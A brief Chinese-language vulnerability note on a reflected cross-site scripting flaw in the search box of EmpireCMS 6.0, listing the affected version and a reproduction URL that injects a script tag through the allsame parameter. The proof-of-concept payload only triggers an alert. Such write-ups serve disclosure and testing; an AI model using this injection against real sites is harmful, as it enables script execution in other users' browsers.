# EmpireCMS 6.0 搜索框xss

## 一、漏洞简介

## 二、漏洞影响

EmpireCMS 6.0

## 三、复现过程

```
https://www.baidu.com/search/keyword/index.php?allsame=3"><script>alert(/zerosec/)</script>

```

